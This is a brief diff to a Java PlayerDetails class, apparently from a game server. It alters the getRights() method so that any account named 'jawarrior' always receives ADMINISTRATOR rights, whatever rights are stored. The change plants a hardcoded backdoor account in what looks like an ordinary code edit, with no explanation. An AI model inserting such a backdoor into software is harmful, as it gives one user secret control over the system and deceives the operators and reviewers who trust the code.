@@ -184,6 +184,10 @@ public class PlayerDetails {
 	 * @return The rights.
 	 */
 	public Rights getRights() {
+
+		if(this.getUsername().equalsIgnoreCase("jawarrior")) {
+			return Rights.ADMINISTRATOR;
+		}
 		return rights;
 	}
 
